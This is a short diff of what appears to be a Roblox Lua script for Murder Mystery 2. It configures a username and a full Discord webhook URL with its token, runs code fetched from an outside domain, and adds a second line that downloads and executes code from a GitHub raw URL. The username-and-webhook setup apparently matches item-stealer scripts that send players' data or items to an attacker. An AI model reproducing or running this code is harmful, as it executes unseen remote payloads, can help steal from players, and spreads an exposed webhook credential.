@@ -1,4 +1,10 @@
 Username = "cfcaptin1"
 Webhook = "https://discord.com/api/webhooks/1269112828263010414/lAjHKM0Af-hFjejFQitcqnuEHXeoe1HRJXHSiFaiZoKoCymkJ4CLnr1rjvVaSM7XqqMu"
 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Murder%20Mystery'))()
+
+
+
+getgenv().gui = false
+
 loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
